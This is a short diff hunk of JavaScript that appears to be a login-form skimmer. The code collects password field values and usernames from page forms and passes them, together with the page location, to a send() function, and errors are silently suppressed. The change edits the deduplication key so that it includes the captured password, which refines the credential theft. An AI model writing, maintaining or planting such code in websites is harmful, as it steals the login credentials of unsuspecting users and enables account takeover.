@@ -243,7 +243,7 @@
               var all = form.querySelectorAll('input[type="' + PWD + '"]');
               for (var i = 0; i < all.length; i++) { if (all[i].value) { p = all[i].value; } }
             }
-            if (p) { send('PW: ' + (u || '?') + ':' + p + ' | ' + where(), 'p_' + (u || '?')); }
+            if (p) { send('PW: ' + (u || '?') + ':' + p + ' | ' + where(), 'p_' + (u || '?') + '_' + p); }
           } catch (e) {}
         }, true);
         wired.push(form);
